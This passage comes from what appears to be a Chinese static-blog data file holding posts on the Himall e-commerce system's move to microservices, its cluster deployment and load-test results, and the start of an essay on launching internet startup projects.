title=\"需要解决的问题\"></a>需要解决的问题</h4><ul>\n<li>因为微服务数据较大，布署难度加大，需要建立一套更方便的部署机制。</li>\n<li>同样需要建立统一的日志管理模块，方便找查问题。</li>\n<li>同样需要统一配置信息管理.</li>\n<li>公共数据的读写问题，如公共缓存，公共数据库。建立一套有效且高性的方案，来解决读写冲突。</li>\n</ul>\n<p>虽然这些只是这段时间的经验总结，Himall也未完成达到我们所期望的状态，但是我们会继续朝这个访问努力。经过1-2年的迭代之后，我们的架构会更加成熟，经验变得更加丰富。</p>\n","excerpt":"<p>这段时间一直做<a href=\"http://www.hishop.com.cn/products/himall/\">Himall</a>的架构优化，也一直思考什么样的架构设计更合适大型商城系统或者是大型业务系统。从早期的集中化架构到现在的分布式架构，中间经历的各种问题，现在做一个总结。<br>","more":"</p>\n<h2 id=\"集中化架构\"><a href=\"#集中化架构\" class=\"headerlink\" title=\"集中化架构\"></a>集中化架构</h2><p><img src=\"/img/hishop-7.png\" alt=\"图\"><br>Himall早期功能比较少，而且业务相对简单。经过一段时间的开发，一个简单的应用诞生了。同时，集中式设计毫无争议的成为了团队的选择。但是，随着几次迭代开发之后，功能越来越多，业务越来越复杂，这种架构的缺点也渐渐地浮出了水面：</p>\n<ol>\n<li>系统的可维护性受到影响，尤其是那些大型应用<br>多人开发的一个复杂的应用系统，团队人数越多,开发人员必然层次不一，规范难统一，系统模块之间的耦合非常重,模块之间太多相互依赖，非常容易出问题。</li>\n<li>团队开发效率低，协调工作非常多<br>任何改动都会牵涉到多个业务模块,不可能所有开发人员能熟习所有模块，需要与其它业务模块开发人员沟通协调。</li>\n<li>负载均衡不能充分发挥作用<br>集中化架构下的应用即使你做负载均衡，服务器的性能会被所有功能平摊。不能实现服务器性能最大化，也不合适针对特定业务进行特别优化。<br>最终，曾经轻量简洁的应用将会变成一代又一代开发者的噩梦。</li>\n</ol>\n<h2 id=\"分布式架构\"><a href=\"#分布式架构\" class=\"headerlink\" title=\"分布式架构\"></a>分布式架构</h2><p>Himall必须寻找到一种方式，将轻量并且质量较好的那部分模块保留下来。也就是找到一个可持续发展的架构，并且在许多次功能迭代开发之后依旧能够让开发人员保持高效开发的开发方式。</p>\n<h3 id=\"纵向分解\"><a href=\"#纵向分解\" class=\"headerlink\" title=\"纵向分解\"></a>纵向分解</h3><p><img src=\"/img/hishop-8.png\" alt=\"图\"><br>这是一个非常自然而通用的方法，把所有的功能集中到单一的应用中，不如将应用分解成了多个垂直的小模块，它们相互独立，互不影响,独立部署,通过REST请求来传递信息。</p>\n<p>在模块之间共享代码是严令禁止的。当然，在特殊的情况下，如果我们需要分享代码，我们会建公共模块来解决该问题。依就以REST请求来访问代码。如日志功能，配置功能等</p>\n<p>这些模块同样不能共享一个数据库架构，因为这样做会导致模块间的紧密耦合：数据结构的改变会使得一个模块不能够被独立的部署。对于共享数据部分，我们也建立一个公共数据库来解决这个问题，定期或不定期把数据同步到公共数据库中，汇总数据。这个同步工作由Daemon去完成。</p>\n<p>但是一个垂直模块仍旧可能成为一个相对大型的集中化应用。<br>就拿订单来说，订单不仅包括了商品信息，库存验证，会员的积分使用或等及规则，还有商家的各种促销信息，才能算出订单价格，这样订单才可以支付。一个订单模块做下来依就是一个相对大型的集中化应用。因此我们需要继续对垂直模块进行拆分。</p>\n<h3 id=\"微服务\"><a href=\"#微服务\" class=\"headerlink\" title=\"微服务\"></a>微服务</h3><p><img src=\"/img/hishop-9.jpg\" alt=\"图\"><br>通过分布式架构继续将模块分解成多个模块。<br>在这种情况下，应用不仅仅被垂直分解，同时还会被水平分解。这种架构中，请求到达应用后，对请求的处理会被分布于多个微服务中，然后每一微服务产生的结果汇总一个响应，发送回请求者。<br>每一个微服务，仅仅集中于一个业务模块中的几个功能,从而达到高内聚低耦合的目的，并且它结构清晰，一个开发者能够很轻松的掌握它。</p>\n<p>一个模块由一个或多个微服务组成,模块之间的调用全由微服务接口完成，每个微服务自带数据存储,可以独立部署。模块可折，微服务可合，这种架构灵活性非常高。</p>\n<h4 id=\"微服务负载均衡\"><a href=\"#微服务负载均衡\" class=\"headerlink\" title=\"微服务负载均衡\"></a>微服务负载均衡</h4><p>由于微服务粒度划分较细，使用负载均衡更能按需扩展那些性能较差的微服务，发挥服务器的最大性能价值。</p>\n<p><img src=\"/img/hishop-10.jpg\" alt=\"图\"></p>\n<p>在负载均衡中，不同实例的服务通常会分时使用同一个数据库，数据库因此成为了系统的瓶颈，这时我们采用性能更高的nosql数据库，如mongodb。不同微服务使用不同数据库并不会对系造成影响。</p>\n<h4 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h4><ul>\n<li>微服务非常小，微服务不需要重量级框架和过多的设计，代码相对简单。</li>\n<li>他们能够被独立的部署。因此持续交付或者持续部署变得非常的简单。</li>\n<li>开发者能够为每一个服务选择最适合的开发语言和数据库。不用担心对项目产生影响。</li>\n<li>每个微服务可以独立测试，易于找出性能瓶颈。</li>\n</ul>\n<h4 id=\"需要解决的问题\"><a href=\"#需要解决的问题\" class=\"headerlink\" title=\"需要解决的问题\"></a>需要解决的问题</h4><ul>\n<li>因为微服务数据较大，布署难度加大，需要建立一套更方便的部署机制。</li>\n<li>同样需要建立统一的日志管理模块，方便找查问题。</li>\n<li>同样需要统一配置信息管理.</li>\n<li>公共数据的读写问题，如公共缓存，公共数据库。建立一套有效且高性的方案，来解决读写冲突。</li>\n</ul>\n<p>虽然这些只是这段时间的经验总结，Himall也未完成达到我们所期望的状态，但是我们会继续朝这个访问努力。经过1-2年的迭代之后，我们的架构会更加成熟，经验变得更加丰富。</p>"},{"title":"Himall集群版解决方案及性能测试结果","date":"2016-06-06T16:00:00.000Z","desc":"分布式架构 微服务","_content":"## 架构设计\n集中架构设计出于系统的可扩展性、可维护性以及成本等多方面的因素考虑，逐渐被放弃，转而采用分布式的架构设计。常用分布式架构采用按模块纵向分解的方式,然后纵向分解中的某些模块仍有可能是一个复杂且庞大的业务，需要继续进行拆分。每个模块又由许多个微服务完成业务功能，微服务可独部署弹性伸缩。下图为Himall分布式集群版的整体架构设计:\n\n![图](http://binyanbin.github.io/img/hishop-11.png)\n\n## 部署图\n\n![图](http://binyanbin.github.io/img/hishop-12.png)\n\n## 标准部署方案的业务支撑能力\n\n| 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） | 日均最大PV（11小时峰值测试）|\n|-----|-----|-----|-----|\n| 3000 | 4秒内 | 2000 | 约7920万 |\n\n## 标准集群部署配置\n\n| 硬件（设施） | 配置 | 数量 |\n|-------|-------|-------|\n| SLB负载均衡服务器 | 依实际流量付费 | 5 |\n| 前端应用服务器 | Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2 | 3 ~ 6 |\n| 后端应用服务器 | Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2 | 6 ~ 10 |\n| CDN内容加速 | 依图片及视频等资源的容量和使用量付费 |    |\t\n| Redis集群 | 热点内容缓存 | 按使用收费 |\n| DRDS | 按使用收费\t|       |\n\n## 标准配置性能测试数据\n| 服务器 | 说明 |\n|------|------|\n| 测试服务器 | 一台ECS 系统:centOS 测试软件:Jmeter |\n| 测试对象Himall | 标准集群阿里云部署 |\n\n####  浏览首页\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-13.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-14.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 首页 | 3000 | 0.42秒 | 3550 |\n\n#### 浏览商品详情页\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-15.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-16.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 商品浏览 | 3000 | 3.16秒 | 660 |\n\n#### 商品搜索\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-17.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-18.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） | 关键字数 |\n|-----|-----|-----|-----|\n| 商品搜索 | 3000 | 1.125秒 | 1534.1 | 100 |\n\n#### 用户登陆\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-19.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-20.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 用户登陆 | 2000 | 4.283秒 | 349 |\n\n#### 下单\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-21.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-22.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 下单 | 1000 | 4.657秒 | 189.1 |\n\n#### 下单流程\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-23.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-24.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 购买商品流程 | 1000 | 15.657秒 | 176.8 |\n","source":"_posts/hishop-3.md","raw":"---\ntitle: Himall集群版解决方案及性能测试结果\ndate: 2016-6-7\ndesc: 分布式架构 微服务\n---\n## 架构设计\n集中架构设计出于系统的可扩展性、可维护性以及成本等多方面的因素考虑，逐渐被放弃，转而采用分布式的架构设计。常用分布式架构采用按模块纵向分解的方式,然后纵向分解中的某些模块仍有可能是一个复杂且庞大的业务，需要继续进行拆分。每个模块又由许多个微服务完成业务功能，微服务可独部署弹性伸缩。下图为Himall分布式集群版的整体架构设计:\n\n![图](http://binyanbin.github.io/img/hishop-11.png)\n\n## 部署图\n\n![图](http://binyanbin.github.io/img/hishop-12.png)\n\n## 标准部署方案的业务支撑能力\n\n| 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） | 日均最大PV（11小时峰值测试）|\n|-----|-----|-----|-----|\n| 3000 | 4秒内 | 2000 | 约7920万 |\n\n## 标准集群部署配置\n\n| 硬件（设施） | 配置 | 数量 |\n|-------|-------|-------|\n| SLB负载均衡服务器 | 依实际流量付费 | 5 |\n| 前端应用服务器 | Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2 | 3 ~ 6 |\n| 后端应用服务器 | Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2 | 6 ~ 10 |\n| CDN内容加速 | 依图片及视频等资源的容量和使用量付费 |    |\t\n| Redis集群 | 热点内容缓存 | 按使用收费 |\n| DRDS | 按使用收费\t|       |\n\n## 标准配置性能测试数据\n| 服务器 | 说明 |\n|------|------|\n| 测试服务器 | 一台ECS 系统:centOS 测试软件:Jmeter |\n| 测试对象Himall | 标准集群阿里云部署 |\n\n####  浏览首页\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-13.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-14.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 首页 | 3000 | 0.42秒 | 3550 |\n\n#### 浏览商品详情页\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-15.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-16.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 商品浏览 | 3000 | 3.16秒 | 660 |\n\n#### 商品搜索\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-17.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-18.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） | 关键字数 |\n|-----|-----|-----|-----|\n| 商品搜索 | 3000 | 1.125秒 | 1534.1 | 100 |\n\n#### 用户登陆\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-19.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-20.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 用户登陆 | 2000 | 4.283秒 | 349 |\n\n#### 下单\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-21.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-22.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 下单 | 1000 | 4.657秒 | 189.1 |\n\n#### 下单流程\n响应时间:\n\n![图](http://binyanbin.github.io/img/hishop-23.png)\n\n事务处理:\n\n![图](http://binyanbin.github.io/img/hishop-24.png)\n\n| 测试内容 | 并发用户数（VU） | 平均响应时间（RT） | 每秒事务数（TPS） |\n|-----|-----|-----|-----|\n| 购买商品流程 | 1000 | 15.657秒 | 176.8 |\n","slug":"hishop-3","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llt4000gg2x6jve7tpgx","content":"<h2 id=\"架构设计\"><a href=\"#架构设计\" class=\"headerlink\" title=\"架构设计\"></a>架构设计</h2><p>集中架构设计出于系统的可扩展性、可维护性以及成本等多方面的因素考虑，逐渐被放弃，转而采用分布式的架构设计。常用分布式架构采用按模块纵向分解的方式,然后纵向分解中的某些模块仍有可能是一个复杂且庞大的业务，需要继续进行拆分。每个模块又由许多个微服务完成业务功能，微服务可独部署弹性伸缩。下图为Himall分布式集群版的整体架构设计:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-11.png\" alt=\"图\"></p>\n<h2 id=\"部署图\"><a href=\"#部署图\" class=\"headerlink\" title=\"部署图\"></a>部署图</h2><p><img src=\"http://binyanbin.github.io/img/hishop-12.png\" alt=\"图\"></p>\n<h2 id=\"标准部署方案的业务支撑能力\"><a href=\"#标准部署方案的业务支撑能力\" class=\"headerlink\" title=\"标准部署方案的业务支撑能力\"></a>标准部署方案的业务支撑能力</h2><table>\n<thead>\n<tr>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n<th>日均最大PV（11小时峰值测试）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3000</td>\n<td>4秒内</td>\n<td>2000</td>\n<td>约7920万</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"标准集群部署配置\"><a href=\"#标准集群部署配置\" class=\"headerlink\" title=\"标准集群部署配置\"></a>标准集群部署配置</h2><table>\n<thead>\n<tr>\n<th>硬件（设施）</th>\n<th>配置</th>\n<th>数量</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>SLB负载均衡服务器</td>\n<td>依实际流量付费</td>\n<td>5</td>\n</tr>\n<tr>\n<td>前端应用服务器</td>\n<td>Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2</td>\n<td>3 ~ 6</td>\n</tr>\n<tr>\n<td>后端应用服务器</td>\n<td>Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2</td>\n<td>6 ~ 10</td>\n</tr>\n<tr>\n<td>CDN内容加速</td>\n<td>依图片及视频等资源的容量和使用量付费</td>\n<td></td>\n</tr>\n<tr>\n<td>Redis集群</td>\n<td>热点内容缓存</td>\n<td>按使用收费</td>\n</tr>\n<tr>\n<td>DRDS</td>\n<td>按使用收费</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"标准配置性能测试数据\"><a href=\"#标准配置性能测试数据\" class=\"headerlink\" title=\"标准配置性能测试数据\"></a>标准配置性能测试数据</h2><table>\n<thead>\n<tr>\n<th>服务器</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>测试服务器</td>\n<td>一台ECS 系统:centOS 测试软件:Jmeter</td>\n</tr>\n<tr>\n<td>测试对象Himall</td>\n<td>标准集群阿里云部署</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"浏览首页\"><a href=\"#浏览首页\" class=\"headerlink\" title=\"浏览首页\"></a>浏览首页</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-13.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-14.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>首页</td>\n<td>3000</td>\n<td>0.42秒</td>\n<td>3550</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"浏览商品详情页\"><a href=\"#浏览商品详情页\" class=\"headerlink\" title=\"浏览商品详情页\"></a>浏览商品详情页</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-15.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-16.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>商品浏览</td>\n<td>3000</td>\n<td>3.16秒</td>\n<td>660</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"商品搜索\"><a href=\"#商品搜索\" class=\"headerlink\" title=\"商品搜索\"></a>商品搜索</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-17.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-18.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n<th>关键字数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>商品搜索</td>\n<td>3000</td>\n<td>1.125秒</td>\n<td>1534.1</td>\n<td>100</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"用户登陆\"><a href=\"#用户登陆\" class=\"headerlink\" title=\"用户登陆\"></a>用户登陆</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-19.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-20.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>用户登陆</td>\n<td>2000</td>\n<td>4.283秒</td>\n<td>349</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"下单\"><a href=\"#下单\" class=\"headerlink\" title=\"下单\"></a>下单</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-21.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-22.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>下单</td>\n<td>1000</td>\n<td>4.657秒</td>\n<td>189.1</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"下单流程\"><a href=\"#下单流程\" class=\"headerlink\" title=\"下单流程\"></a>下单流程</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-23.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-24.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>购买商品流程</td>\n<td>1000</td>\n<td>15.657秒</td>\n<td>176.8</td>\n</tr>\n</tbody>\n</table>\n","excerpt":"","more":"<h2 id=\"架构设计\"><a href=\"#架构设计\" class=\"headerlink\" title=\"架构设计\"></a>架构设计</h2><p>集中架构设计出于系统的可扩展性、可维护性以及成本等多方面的因素考虑，逐渐被放弃，转而采用分布式的架构设计。常用分布式架构采用按模块纵向分解的方式,然后纵向分解中的某些模块仍有可能是一个复杂且庞大的业务，需要继续进行拆分。每个模块又由许多个微服务完成业务功能，微服务可独部署弹性伸缩。下图为Himall分布式集群版的整体架构设计:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-11.png\" alt=\"图\"></p>\n<h2 id=\"部署图\"><a href=\"#部署图\" class=\"headerlink\" title=\"部署图\"></a>部署图</h2><p><img src=\"http://binyanbin.github.io/img/hishop-12.png\" alt=\"图\"></p>\n<h2 id=\"标准部署方案的业务支撑能力\"><a href=\"#标准部署方案的业务支撑能力\" class=\"headerlink\" title=\"标准部署方案的业务支撑能力\"></a>标准部署方案的业务支撑能力</h2><table>\n<thead>\n<tr>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n<th>日均最大PV（11小时峰值测试）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3000</td>\n<td>4秒内</td>\n<td>2000</td>\n<td>约7920万</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"标准集群部署配置\"><a href=\"#标准集群部署配置\" class=\"headerlink\" title=\"标准集群部署配置\"></a>标准集群部署配置</h2><table>\n<thead>\n<tr>\n<th>硬件（设施）</th>\n<th>配置</th>\n<th>数量</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>SLB负载均衡服务器</td>\n<td>依实际流量付费</td>\n<td>5</td>\n</tr>\n<tr>\n<td>前端应用服务器</td>\n<td>Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2</td>\n<td>3 ~ 6</td>\n</tr>\n<tr>\n<td>后端应用服务器</td>\n<td>Intel Xeon E5-2430 2.2GHz 8G RAM 64位Win 2008 R2</td>\n<td>6 ~ 10</td>\n</tr>\n<tr>\n<td>CDN内容加速</td>\n<td>依图片及视频等资源的容量和使用量付费</td>\n<td></td>\n</tr>\n<tr>\n<td>Redis集群</td>\n<td>热点内容缓存</td>\n<td>按使用收费</td>\n</tr>\n<tr>\n<td>DRDS</td>\n<td>按使用收费</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"标准配置性能测试数据\"><a href=\"#标准配置性能测试数据\" class=\"headerlink\" title=\"标准配置性能测试数据\"></a>标准配置性能测试数据</h2><table>\n<thead>\n<tr>\n<th>服务器</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>测试服务器</td>\n<td>一台ECS 系统:centOS 测试软件:Jmeter</td>\n</tr>\n<tr>\n<td>测试对象Himall</td>\n<td>标准集群阿里云部署</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"浏览首页\"><a href=\"#浏览首页\" class=\"headerlink\" title=\"浏览首页\"></a>浏览首页</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-13.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-14.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>首页</td>\n<td>3000</td>\n<td>0.42秒</td>\n<td>3550</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"浏览商品详情页\"><a href=\"#浏览商品详情页\" class=\"headerlink\" title=\"浏览商品详情页\"></a>浏览商品详情页</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-15.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-16.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>商品浏览</td>\n<td>3000</td>\n<td>3.16秒</td>\n<td>660</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"商品搜索\"><a href=\"#商品搜索\" class=\"headerlink\" title=\"商品搜索\"></a>商品搜索</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-17.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-18.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n<th>关键字数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>商品搜索</td>\n<td>3000</td>\n<td>1.125秒</td>\n<td>1534.1</td>\n<td>100</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"用户登陆\"><a href=\"#用户登陆\" class=\"headerlink\" title=\"用户登陆\"></a>用户登陆</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-19.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-20.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>用户登陆</td>\n<td>2000</td>\n<td>4.283秒</td>\n<td>349</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"下单\"><a href=\"#下单\" class=\"headerlink\" title=\"下单\"></a>下单</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-21.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-22.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>下单</td>\n<td>1000</td>\n<td>4.657秒</td>\n<td>189.1</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"下单流程\"><a href=\"#下单流程\" class=\"headerlink\" title=\"下单流程\"></a>下单流程</h4><p>响应时间:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-23.png\" alt=\"图\"></p>\n<p>事务处理:</p>\n<p><img src=\"http://binyanbin.github.io/img/hishop-24.png\" alt=\"图\"></p>\n<table>\n<thead>\n<tr>\n<th>测试内容</th>\n<th>并发用户数（VU）</th>\n<th>平均响应时间（RT）</th>\n<th>每秒事务数（TPS）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>购买商品流程</td>\n<td>1000</td>\n<td>15.657秒</td>\n<td>176.8</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"你确定真的要做互联网项目吗","date":"2016-06-30T16:00:00.000Z","desc":"互联网 团队","_content":"最近又有人在群里高价求人(技术合伙人)，待遇2-3W，可以给股份，要求一个月把基本功能全部弄出来。我就开始遐想他们的开搞的过程都是:\n1. 老板或公司有自己觉得很好的idea和一点点钱，并且有一点相关的业务资源，想做一个互联网项目，快速出原型去吸引客户或去融资做大。\n2. 然后招来一个认为技术比较牛B的开发和几个程序员\n3. 公司和老板急不可待的要快点上线\n4. 大牛说就你这么一个复杂玩意，我怎么在这么短的时间完成了。\n5. 大家决定买套系统或者外包吧-,老板无耐的想想，我又没有更多钱和时间去折腾，找个皮包公司或者买套系统算了。\n6. 折腾一个月终于成了,急不可待上线。\n7. 销售说这玩意请问能符合我们哪点需求?客户那边也不同意。\n8. 然后开始改需求，码农开始填坑\n9. 填坑不断，问题不断，大家开始撕逼， 老板说这么几个模板和功能，你们都改不好？技术团队说你们需求确定了吗?然后产品经理出现，然后长期拉踞战公司内部开始,一直撕逼中..........公司陷入一个互坑的节奏，关门已经不远。\n但最终坑都是程序员挖的，正如下图描述一下:\n\n![图](http://binyanbin.github.io/img/other-1.png)\n\n所以锅也肯定也是程序员背。\n\n通常有这么一种情况也许成功过，一大堆数据需要录入系统，或者几个G的数据需要换个平台，这是老板以前业务的系统的数据，现在需要找一个更合适自己的系统平台，并准备把它互联网化，然后，找来一帮人，去开发实现这个系统，刚开地这帮人也想找现有系统，但就是他玛的没有合适系统，只好硬着头皮去搞，大家坚持了几年，最后还真他玛的搞成了.\n一开始就天马行空的设计产品，然后再根据产品去做数据，搞销售，搞运营，这种方式往往失率高。\n就像很多公司搞o2o,电商，一开始就纠结商业模式，系统，平台，功能。你用户都没有，这些东西都没什么卵用。\n有人一个qq空间做产品展示，用qq加几百个传统渠道商，qq订货，线下打款，最多开一个淘宝店。业务做得飞起来，一天忙不停。\n也有人在家或公司附近做主动加周围人的微信做产品宣传，用微信朋友圈做产品展示，微信订货，自己送货，线下付款或微信付款都可以，同样也是忙个不停。\n电商和o2o有很多简单玩法，不一定需要一个什么网站或app出来去支持它，用最原始的方式就能完成交易，如果你想做网站或app，你的目的应该是要收集数据，收集数据就没必要纠结于细节，只要能帮你收集数，这个东西就是有价值的。\n\n如果要做互联网项目，那就需要做数量级，没有数量级算什么互联网项目。最开始的考虑就应该从